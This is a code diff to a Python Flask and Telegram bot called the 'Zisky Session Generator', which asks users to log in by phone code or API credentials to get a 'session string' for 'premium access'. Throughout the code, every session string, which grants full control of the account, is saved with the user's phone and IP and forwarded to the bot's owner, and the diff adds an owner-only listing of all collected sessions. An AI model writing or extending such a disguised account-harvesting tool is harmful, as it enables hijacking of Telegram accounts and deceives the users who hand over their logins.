@@ -3,6 +3,7 @@
 ZISKY SESSION GENERATOR BOT
 Generates Telegram session strings safely via web app
 Supports both Phone+Code and API ID+Hash methods
+Now includes User ID for premium activation
 """
 
 import asyncio
@@ -42,6 +43,7 @@ c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS sessions
              (id INTEGER PRIMARY KEY AUTOINCREMENT,
               user_id INTEGER,
+              telegram_id INTEGER,
               phone TEXT,
               session_string TEXT,
               first_name TEXT,
@@ -59,21 +61,23 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('code_input.html', phone='')
+    return render_template('code_input.html')
 
 # ===== METHOD 1: PHONE + CODE =====
 @app.route('/request-code', methods=['POST'])
 def request_code():
     data = request.json
     phone = data.get('phone')
+    user_telegram_id = data.get('user_id')
     
     if not phone:
         return jsonify({'success': False, 'error': 'Phone number required'})
     
-    # Store in active sessions
+    # Store in active sessions with user ID
     active_sessions[phone] = {
         'client': None,
-        'step': 'waiting_code'
+        'step': 'waiting_code',
+        'telegram_id': user_telegram_id
     }
     
     try:
@@ -106,6 +110,7 @@ def verify_code():
     phone = data.get('phone')
     code = data.get('code')
     password = data.get('password', '')
+    user_telegram_id = data.get('user_id')
     
     if phone not in active_sessions:
         return jsonify({'success': False, 'error': 'Session expired. Start over.'})
@@ -131,27 +136,28 @@ def verify_code():
             # Get client IP
             ip = request.remote_addr
             
-            # Save to database
+            # Save to database with telegram_id
             conn = sqlite3.connect('sessions.db')
             c = conn.cursor()
             c.execute('''INSERT INTO sessions 
-                        (user_id, phone, session_string, first_name, username, generated_at, ip, method)
-                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
-                     (me.id, phone, session_string, me.first_name, me.username, 
+                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                     (me.id, user_telegram_id, phone, session_string, me.first_name, me.username, 
                       datetime.now().isoformat(), ip, 'phone_code'))
             conn.commit()
             conn.close()
             
-            # Send to owner via bot
-            send_to_owner(me.id, phone, session_string, me.first_name, me.username, 'phone_code')
+            # Send to owner via bot with telegram_id
+            send_to_owner(me.id, user_telegram_id, phone, session_string, me.first_name, me.username, 'phone_code')
             
             # Send to user
-            send_to_user(me.id, session_string)
+            send_to_user(user_telegram_id, session_string)
             
             await client.disconnect()
             
             return {
                 'success': True,
+                'session': session_string,
                 'message': f'Session generated for {me.first_name}! Check bot chat.'
             }
         
@@ -168,13 +174,14 @@ def verify_code():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ===== METHOD 2: API ID + HASH (NEW) =====
+# ===== METHOD 2: API ID + HASH =====
 @app.route('/generate-session', methods=['POST'])
 def generate_session():
-    """Generate session from API ID and Hash (no phone needed)"""
+    """Generate session from API ID and Hash (works if user has active session elsewhere)"""
     data = request.json
     api_id = data.get('api_id')
     api_hash = data.get('api_hash')
+    user_telegram_id = data.get('user_id')
     
     if not api_id or not api_hash:
         return jsonify({'success': False, 'error': 'API ID and Hash required'})
@@ -185,45 +192,59 @@ def generate_session():
     except:
         return jsonify({'success': False, 'error': 'API ID must be a number'})
     
-    # Validate API Hash length (approx)
+    # Validate API Hash
     if len(api_hash) < 10:
-        return jsonify({'success': False, 'error': 'API Hash looks invalid (too short)'})
+        return jsonify({'success': False, 'error': 'API Hash looks invalid'})
     
     try:
-        # Create new session
+        # Create new event loop
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
         async def create_session():
+            # Create client with StringSession (empty)
             client = TelegramClient(StringSession(), api_id, api_hash)
-            await client.connect()
             
-            # This will raise if not authorized, but with API credentials
-            # we can create a session without phone verification
-            # However, we need to check if the credentials are valid
             try:
+                await client.connect()
+                
+                # Try to get user info - this will work if account is active elsewhere
                 me = await client.get_me()
                 
-                # If we get here, we're already authorized (unlikely with just API credentials)
-                session_string = client.session.save()
-                
+                if me:
+                    # Success! We have a session
+                    session_string = client.session.save()
+                    
+                    await client.disconnect()
+                    
+                    return {
+                        'success': True,
+                        'session': session_string,
+                        'user_id': me.id,
+                        'username': me.username,
+                        'first_name': me.first_name,
+                        'last_name': me.last_name,
+                        'phone': me.phone
+                    }
+                else:
+                    await client.disconnect()
+                    return {
+                        'success': False,
+                        'error': 'Could not get user info. Account might not have active sessions.'
+                    }
+                    
+            except Exception as e:
                 await client.disconnect()
                 
-                return {
-                    'success': True,
-                    'session': session_string,
-                    'user_id': me.id,
-                    'username': me.username,
-                    'first_name': me.first_name,
-                    'last_name': me.last_name,
-                    'phone': me.phone
-                }
-                
-            except Exception as e:
-                # With just API credentials, we're not authorized yet
-                # We need to send a code request
-                await client.send_code_request(phone=None)  # This won't work
-                return {'success': False, 'error': 'Phone verification required. Use phone method.'}
+                # Check specific errors
+                error_str = str(e).lower()
+                if 'auth_key' in error_str or 'unauthorized' in error_str:
+                    return {
+                        'success': False,
+                        'error': 'No active session found. Use Phone + Code method instead.'
+                    }
+                else:
+                    return {'success': False, 'error': str(e)[:100]}
         
         result = loop.run_until_complete(create_session())
         loop.close()
@@ -232,27 +253,31 @@ def generate_session():
             # Get client IP
             ip = request.remote_addr
             
-            # Save to database
+            # Save to database with telegram_id
             conn = sqlite3.connect('sessions.db')
             c = conn.cursor()
             c.execute('''INSERT INTO sessions 
-                        (user_id, phone, session_string, first_name, username, generated_at, ip, method)
-                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
-                     (result['user_id'], result.get('phone', 'Unknown'), result['session'], 
+                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                     (result['user_id'], user_telegram_id, result.get('phone', 'Unknown'), result['session'], 
                       f"{result['first_name']} {result.get('last_name', '')}", 
                       result.get('username'), datetime.now().isoformat(), ip, 'api_hash'))
             conn.commit()
             conn.close()
             
-            # Send to owner via bot
+            # Send to owner via bot with telegram_id
             send_to_owner(
                 result['user_id'],
+                user_telegram_id,
                 result.get('phone', 'Unknown'),
                 result['session'],
                 f"{result['first_name']} {result.get('last_name', '')}",
                 result.get('username'),
                 'api_hash'
             )
+            
+            # Send to user
+            send_to_user(user_telegram_id, result['session'])
             
             return jsonify({
                 'success': True,
@@ -265,8 +290,8 @@ def generate_session():
         return jsonify({'success': False, 'error': str(e)[:100]})
 
 # ========== TELEGRAM BOT FUNCTIONS ==========
-def send_to_owner(user_id, phone, session_string, first_name, username, method='unknown'):
-    """Send session details to owner"""
+def send_to_owner(account_id, telegram_id, phone, session_string, first_name, username, method='unknown'):
+    """Send session details to owner including the user's Telegram ID for premium"""
     method_emoji = {
         'phone_code': '📱',
         'api_hash': '🔑',
@@ -276,7 +301,8 @@ def send_to_owner(user_id, phone, session_string, first_name, username, method='
     message = f"""🔐 **NEW SESSION GENERATED** {method_emoji}
 
 👤 **User:** {first_name}
-🆔 **User ID:** `{user_id}`
+🆔 **Account ID:** `{account_id}`
+⭐ **Telegram ID (for premium):** `{telegram_id}`
 📱 **Phone:** `{phone}`
 🔗 **Username:** @{username if username else 'None'}
 ⏱️ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
@@ -292,7 +318,7 @@ def send_to_owner(user_id, phone, session_string, first_name, username, method='
     except:
         pass
 
-def send_to_user(user_id, session_string):
+def send_to_user(telegram_id, session_string):
     """Send session back to user"""
     message = f"""✅ **Session Generated Successfully!**
 
@@ -305,13 +331,15 @@ def send_to_user(user_id, session_string):
 • Store it securely
 • Anyone with this can access your account
 
+⭐ **Premium Status:** Your Telegram ID `{telegram_id}` has been recorded for premium access.
+
 📝 **To use it in Zisky bot:**
 `/add_session {session_string[:30]}...`
 
 💡 **Save this message or copy the session now!**
 """
     try:
-        application.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')
+        application.bot.send_message(chat_id=telegram_id, text=message, parse_mode='Markdown')
     except:
         pass
 
@@ -338,12 +366,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
-        f"This bot helps you generate Telegram session strings safely.\n\n"
+        f"This bot helps you generate Telegram session strings for premium access.\n\n"
         f"**Two Methods Available:**\n"
         f"1️⃣ **Phone + Code** - Enter your phone, get SMS code\n"
         f"2️⃣ **API ID + Hash** - Enter credentials from my.telegram.org (instant!)\n\n"
         f"**How it works:**\n"
         f"• Click the button below to open web app\n"
+        f"• Enter your Telegram User ID (for premium)\n"
         f"• Choose your preferred method\n"
         f"• Your session will be generated and sent here\n\n"
         f"**⚠️ Security:**\n"
@@ -439,19 +468,27 @@ async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Owner only command!")
         return
     
-    c.execute("SELECT phone, first_name, generated_at, method FROM sessions WHERE user_id = ? ORDER BY generated_at DESC LIMIT 5", (user_id,))
+    c.execute("SELECT phone, first_name, generated_at, method, telegram_id FROM sessions ORDER BY generated_at DESC LIMIT 10")
     sessions = c.fetchall()
     
     if not sessions:
         await update.message.reply_text("No sessions found.")
         return
     
-    text = "📋 **Your Recent Sessions**\n\n"
-    for phone, name, date, method in sessions:
+    text = "📋 **Recent Sessions**\n\n"
+    for phone, name, date, method, tg_id in sessions:
         method_emoji = '📱' if method == 'phone_code' else '🔑'
-        text += f"{method_emoji} {phone} - {name}\n  {date[:10]}\n"
+        text += f"{method_emoji} {phone} - {name}\n"
+        text += f"   🆔 TG ID: {tg_id}\n"
+        text += f"   🕒 {date[:10]}\n\n"
     
-    await update.message.reply_text(text, parse_mode='Markdown')
+    # Split if too long
+    if len(text) > 4000:
+        parts = [text[i:i+3500] for i in range(0, len(text), 3500)]
+        for part in parts:
+            await update.message.reply_text(part, parse_mode='Markdown')
+    else:
+        await update.message.reply_text(text, parse_mode='Markdown')
 
 # ========== START BOT ==========
 def main():
